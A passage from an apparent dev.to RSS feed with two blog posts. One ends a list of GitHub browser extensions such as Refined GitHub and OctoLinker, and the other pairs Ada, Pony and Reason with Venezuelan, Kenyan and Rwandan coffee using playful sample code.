&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--8z0wfvd_--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ocjsjbccv0eqzdqdjpds.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--8z0wfvd_--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ocjsjbccv0eqzdqdjpds.png" alt="Enhanced GitHub screenshot1"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#3-github-code-folding"&gt;
  &lt;/a&gt;
  3. &lt;a href="https://github.com/noam3127/github-code-folding"&gt;GitHub Code Folding&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;It enables code folding in GitHub.&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--qunnBTfV--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/hfllo0o7imcppg8ib6m8.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--qunnBTfV--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/hfllo0o7imcppg8ib6m8.png" alt="Code Folding extension screenshot"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#4-sourcegraph"&gt;
  &lt;/a&gt;
  4. &lt;a href="https://github.com/sourcegraph/sourcegraph/tree/main/client/browser"&gt;Sourcegraph&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;It makes you go to definition &amp;amp; find references (currently for Go, Java, TypeScript, JavaScript, and Python).&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--MnNqCvAJ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/stxqsw1tmc26kyic8523.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--MnNqCvAJ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/stxqsw1tmc26kyic8523.png" alt="Sourcegraph extension screenshot"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#5-notifications-preview-for-github"&gt;
  &lt;/a&gt;
  5. &lt;a href="https://github.com/tanmayrajani/notifications-preview-github"&gt;Notifications Preview for GitHub&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;This extension makes you : &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Show the count of notifications on the bell icon &lt;/li&gt;
&lt;li&gt;Preview the unread notifications using pop-overs on hover&lt;/li&gt;
&lt;li&gt;Allow to perform actions like marking as read and unsubscribing on the notifications.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--CKfIlhb0--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/9czthe3mpijhy74249zt.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--CKfIlhb0--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/9czthe3mpijhy74249zt.png" alt="Notification extension screenshot"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#6-file-icons-for-github-and-gitlab"&gt;
  &lt;/a&gt;
  6. &lt;a href="https://github.com/homerchen19/github-file-icons"&gt;File Icons for GitHub and GitLab&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;It gives you different file icons in GitHub or GitLab.&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--UrL6Z6DY--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/r7r3d7lrb14ipt7maikk.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--UrL6Z6DY--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/r7r3d7lrb14ipt7maikk.jpg" alt="File Icons screenshot"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#7-octolinker"&gt;
  &lt;/a&gt;
  7. &lt;a href="https://github.com/OctoLinker/OctoLinker"&gt;OctoLinker&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;It makes navigating through the code more efficient by turning language-specific statements like &lt;code&gt;include&lt;/code&gt;, &lt;code&gt;require&lt;/code&gt; or &lt;code&gt;import&lt;/code&gt; into clickable links.&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--cGYxm73T--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/cdqcz54vfkezo7vp11rw.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--cGYxm73T--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/cdqcz54vfkezo7vp11rw.png" alt="OctoLinker extension screenshot"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#8-github-isometric-contributions"&gt;
  &lt;/a&gt;
  8. &lt;a href="https://github.com/jasonlong/isometric-contributions"&gt;GitHub Isometric Contributions&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;It allows you to toggle between the normal GitHub contribution chart and an isometric pixel art version.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;2D Chart&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--CeMzUoUi--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/fv8hmghwl2ehui57ce4k.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--CeMzUoUi--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/fv8hmghwl2ehui57ce4k.png" alt="normal chart"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;3D Chart&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--AqvtU3-A--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/pdg4f7dcmbn5dewlibbx.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--AqvtU3-A--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/pdg4f7dcmbn5dewlibbx.png" alt="3D chart"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#9-gifs-for-github"&gt;
  &lt;/a&gt;
  9. &lt;a href="https://github.com/N1ck/gifs-for-github"&gt;GIFs for GitHub&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;It makes it easier to search GIPHY and add a GIF into any GitHub comment box.&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--TOxesm0U--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/kfpjwt9c3s7re5fra0im.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--TOxesm0U--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/kfpjwt9c3s7re5fra0im.png" alt="GIFs extension screenshot"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#10-refined-github"&gt;
  &lt;/a&gt;
  10. &lt;a href="https://github.com/sindresorhus/refined-github"&gt;Refined GitHub&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;This extension has a lot of features like :&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Making whitespace characters visible
&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--w7_WfX1G--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/l4d0eu4g5i4ainzmy9li.png" alt="white space"&gt;
&lt;/li&gt;
&lt;li&gt;Adding one-click merge conflict fixers
&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--js-Sx7Qm--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/lym459mhu4w8nwmtbcmj.png" alt="one-click merge conflict"&gt;
&lt;/li&gt;
&lt;li&gt;Adding reaction avatars showing who reacted to a comment
&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--bmwnyBJV--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/yg7c8g553ebzs88qh4tw.png" alt="reaction avatars"&gt;
&lt;/li&gt;
&lt;li&gt;Letting you hide every event except comments or unresolved comments in issues and PRs
&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--LNQ8qlyA--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/di2zrcat9ll1jyk5515i.png" alt="hide every event"&gt;
&lt;/li&gt;
&lt;li&gt;Linking issue/PR references and URLs in code and conversation titles
&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--BGFu9dfm--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/iu3xal1ov47yxv3e7f11.png" alt="Linkifing issue/PR references and URLs"&gt;
&lt;/li&gt;
&lt;li&gt;Adding the option to wait for checks when merging a PR&lt;/li&gt;
&lt;li&gt;Adding a button to revert all the changes to a file in a PR.&lt;/li&gt;
&lt;/ul&gt;




&lt;h2&gt;
  &lt;a href="#conclusion"&gt;
  &lt;/a&gt;
  Conclusion
&lt;/h2&gt;

&lt;p&gt;I tried to show some useful GitHub extensions that I know. There are a lot of other extensions you can use to enhance your experience.  If you want to explore other awesome GitHub extensions, you can check this &lt;a href="https://project-awesome.org/stefanbuck/awesome-browser-extensions-for-github"&gt;link&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Which GitHub extension do you like more? Let me know!&lt;/p&gt;

</description>
      <category>github</category>
      <category>productivity</category>
      <category>opensource</category>
    </item>
    <item>
      <title>What Do Exotic Programming Languages and Single-origin Coffee Beans Have in Common?</title>
      <author>Jorge Díaz</author>
      <pubDate>Thu, 24 Jun 2021 12:01:18 +0000</pubDate>
      <link>https://dev.to/fidel/what-do-exotic-programming-languages-and-single-origin-coffee-beans-have-in-common-37af</link>
      <guid>https://dev.to/fidel/what-do-exotic-programming-languages-and-single-origin-coffee-beans-have-in-common-37af</guid>
      <description>&lt;p&gt;This blog post started when I wanted to combine two of the things I love: playing around with different programming languages and brewing my own coffee with different beans from all around the world. Then, that got me thinking: how do some of the most interesting programming languages I've used relate to some of the most delicious and peculiar beans I've had the chance to taste? &lt;/p&gt;

&lt;p&gt;Mind you, I don't consider myself to be an expert on either of the two. I can, however, share enough knowledge today so that you can learn something new! And, who knows, maybe you’ll be inspired enough to try out a new language or coffee variety.&lt;/p&gt;

&lt;p&gt;Without further ado, make yourself a coffee, take a seat and enjoy my coffee/programming language pairings!&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#ada-and-venezuelan-coffee-utterly-great-almost-perfect-and-incredibly-difficult-to-find"&gt;
  &lt;/a&gt;
  Ada and Venezuelan coffee: Utterly great - almost perfect - and incredibly difficult to find
&lt;/h2&gt;

&lt;p&gt;I'll start things by coming clean: Ada is my favourite programming language. And I'm originally from Venezuela. So there's going to be some bias here. However, I'm pretty sure anyone who’s tried Ada can admit that it's a hell of a language! And Venezuela has always been pretty well known for its amazing coffee and cocoa beans, so hopefully, I'm not too detached from the truth anyway.&lt;/p&gt;

&lt;p&gt;What makes them so great, then? When it comes to Ada, one has to first understand what it was made for: highly secure and reliable systems. Which explains many of the things surrounding the language; a very strict type system that's also incredibly expressive, it possesses a weird array and string types that force you to always define their size so that the compiler can guarantee that there's not going to be an overflow. Plus, its syntax, while seemingly verbose at first, is very well suited for readability (something that makes a lot of sense, given that we spend way more time reading software than writing it).&lt;/p&gt;

&lt;p&gt;All in all, Ada is a very well-thought-out programming language that makes way too much sense most of the time and thus, in my opinion, lends itself quite well for learning programming concepts, since it's a language that aids you a lot in your thinking process.&lt;/p&gt;

&lt;p&gt;Unfortunately, though, it's garnered a bad rap since the very beginning for its relation with the US Department of Defence and being a closed language with a paid compiler. Nowadays, you can download a free version of it, but it’s still not widely used. Many issues you'll find while developing will not be as simple to solve as doing a Google search or looking on Stack Overflow.&lt;/p&gt;

&lt;p&gt;As for Venezuelan coffee: if you can imagine how good coffee should taste like, then you pretty much know why it's so highly regarded. Because of the country’s currently “fragile” state, it's not as readily available in your everyday roaster coffee shop. Same as with Ada, if you get your hands on it, please try it. You won't regret it!&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight ada"&gt;&lt;code&gt;&lt;span class="kn"&gt;with&lt;/span&gt; &lt;span class="nn"&gt;Ada&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nn"&gt;Text_IO&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;use&lt;/span&gt; &lt;span class="n"&gt;Ada&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Text_IO&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="kd"&gt;procedure&lt;/span&gt; &lt;span class="nf"&gt;Drinking_Venezuelan_Coffee&lt;/span&gt; &lt;span class="k"&gt;is&lt;/span&gt;
    &lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nf"&gt;Level_Type&lt;/span&gt; &lt;span class="k"&gt;is&lt;/span&gt; &lt;span class="k"&gt;range&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="o"&gt;..&lt;/span&gt; &lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nf"&gt;Coffee_Origin_Type&lt;/span&gt; &lt;span class="k"&gt;is&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Venezuela&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Kenya&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Rwanda&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Sumatra&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nf"&gt;Coffee_Mug&lt;/span&gt; &lt;span class="k"&gt;is&lt;/span&gt; &lt;span class="k"&gt;record&lt;/span&gt;
        &lt;span class="n"&gt;Level&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Level_Type&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="n"&gt;Coffee_Origin&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Coffee_Origin_Type&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;end&lt;/span&gt; &lt;span class="k"&gt;record&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="kd"&gt;procedure&lt;/span&gt; &lt;span class="nf"&gt;Fill_Mug&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;M&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="k"&gt;out&lt;/span&gt; &lt;span class="n"&gt;Coffee_Mug&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;is&lt;/span&gt;
    &lt;span class="k"&gt;begin&lt;/span&gt;
        &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="n"&gt;M&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Level&lt;/span&gt; &lt;span class="k"&gt;is&lt;/span&gt;
            &lt;span class="k"&gt;when&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="o"&gt;..&lt;/span&gt; &lt;span class="mi"&gt;99&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; 
                &lt;span class="n"&gt;M&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Level&lt;/span&gt; &lt;span class="o"&gt;:=&lt;/span&gt; &lt;span class="n"&gt;Level_Type&lt;/span&gt;&lt;span class="p"&gt;'&lt;/span&gt;&lt;span class="na"&gt;Last&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
                &lt;span class="n"&gt;Put_line&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"Mug filled!"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
            &lt;span class="k"&gt;when&lt;/span&gt; &lt;span class="k"&gt;others&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; 
                &lt;span class="n"&gt;Put_Line&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"Mug is already full!"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="k"&gt;end&lt;/span&gt; &lt;span class="k"&gt;case&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;end&lt;/span&gt; &lt;span class="n"&gt;Fill_Mug&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="n"&gt;My_Mug&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Coffee_Mug&lt;/span&gt; &lt;span class="o"&gt;:=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Level&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Coffee_Origin&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;Venezuela&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="k"&gt;begin&lt;/span&gt;
    &lt;span class="n"&gt;Fill_Mug&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;My_Mug&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt; &lt;span class="n"&gt;Drinking_Venezuelan_Coffee&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#pony-and-kenyan-coffee-downtoearth-and-inconspicuous-but-full-of-flavour"&gt;
  &lt;/a&gt;
  Pony and Kenyan coffee: Down-to-earth and inconspicuous, but full of flavour
&lt;/h2&gt;

&lt;p&gt;What I like a lot about Kenyan coffee is that it's a very grounded coffee. You can almost taste the earth with every sip of it. If you don't get what I mean, imagine the amazing smell of earth just before it rains. Yep, Kenyan coffee tastes that good!&lt;/p&gt;

&lt;p&gt;That same feeling is the one I get whenever I do something with the Pony language. Pony is a very welcoming programming language because it doesn't try to be more than it is. And yet, what it has to offer is quite powerful and unique. For starters, Pony is an actor based language. If you are familiar with Erlang or using channels, you'll get the gist of it. But if not, think of every actor as a living object (or process) that communicates with other actors by sending and receiving messages. This already makes Pony quite suitable for concurrent systems and programs, but there's more: Pony is also a capabilities based programming language, in which everything has a set of rules that tells you what you can and cannot do with it. For instance, a variable with the Value capability is read-only, which means that you can safely share it between your actors. A variable with the Reference capability is mutable, which means that you can't pass it around. There are of course many more of them, but hopefully you got the gist of it. All of this comes packaged in a nice syntax that reminds me of Python, which is always a nice language to read.&lt;/p&gt;

&lt;p&gt;Did it sound compelling? I hope it did! And if you decide to try Pony, please ask a friendly barista to make you a cup of Kenyan coffee to go along with it. You can have it however you like, but I recommend it black and without sugar.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight pony"&gt;&lt;code&gt;&lt;span class="kr"&gt;actor&lt;/span&gt; &lt;span class="nc"&gt;Customer&lt;/span&gt;
  &lt;span class="kr"&gt;let&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nc"&gt;String&lt;/span&gt;
  &lt;span class="kr"&gt;var&lt;/span&gt; &lt;span class="nc"&gt;_coffee&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nc"&gt;String&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;""&lt;/span&gt;

  &lt;span class="kr"&gt;new&lt;/span&gt; &lt;span class="n"&gt;create&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;'&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nc"&gt;String&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;
    &lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;'&lt;/span&gt;

  &lt;span class="kr"&gt;be&lt;/span&gt; &lt;span class="n"&gt;ask_for_coffee&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nc"&gt;Barista&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;
    &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;prepare_coffee&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kr"&gt;this&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

  &lt;span class="kr"&gt;be&lt;/span&gt; &lt;span class="n"&gt;receive_coffee&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;coffee&lt;/span&gt;&lt;span class="p"&gt;'&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nc"&gt;String&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;
    &lt;span class="nc"&gt;_coffee&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;coffee&lt;/span&gt;&lt;span class="p"&gt;'&lt;/span&gt;

&lt;span class="kr"&gt;actor&lt;/span&gt; &lt;span class="nc"&gt;Barista&lt;/span&gt;
  &lt;span class="kr"&gt;let&lt;/span&gt; &lt;span class="n"&gt;available_coffee&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nc"&gt;String&lt;/span&gt;
  &lt;span class="kr"&gt;let&lt;/span&gt; &lt;span class="nc"&gt;_out&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nc"&gt;OutStream&lt;/span&gt;

  &lt;span class="kr"&gt;new&lt;/span&gt; &lt;span class="n"&gt;create&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;available_coffee&lt;/span&gt;&lt;span class="p"&gt;'&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nc"&gt;String&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;out&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nc"&gt;OutStream&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;
    &lt;span class="n"&gt;available_coffee&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;available_coffee&lt;/span&gt;&lt;span class="p"&gt;'&lt;/span&gt;
    &lt;span class="nc"&gt;_out&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;out&lt;/span&gt;

  &lt;span class="kr"&gt;be&lt;/span&gt; &lt;span class="n"&gt;prepare_coffee&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nc"&gt;Customer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nc"&gt;String&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;
      &lt;span class="nc"&gt;_out&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"One "&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;available_coffee&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s"&gt;" coffee for "&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
      &lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;receive_coffee&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;available_coffee&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="kr"&gt;actor&lt;/span&gt; &lt;span class="nc"&gt;Main&lt;/span&gt;
  &lt;span class="kr"&gt;new&lt;/span&gt; &lt;span class="n"&gt;create&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;env&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nc"&gt;Env&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;

  &lt;span class="kr"&gt;var&lt;/span&gt; &lt;span class="n"&gt;barista&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nc"&gt;Barista&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"Kenyan"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;env&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;out&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="kr"&gt;var&lt;/span&gt; &lt;span class="n"&gt;customer&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nc"&gt;Customer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"Jane"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

  &lt;span class="n"&gt;customer&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ask_for_coffee&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;barista&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#reason-and-rwandan-coffee-familiar-on-the-outside-amazingly-exciting-on-the-inside"&gt;
  &lt;/a&gt;
  Reason and Rwandan coffee: Familiar on the outside, amazingly exciting on the inside
&lt;/h2&gt;

&lt;p&gt;If there's something that Reason and Rwandan coffee have in common, is that they both look like something else at first glance. When it comes to Rwandan coffee it just looks like, well, any other coffee, but when you try it… uff, it's like no coffee you've ever had!&lt;/p&gt;

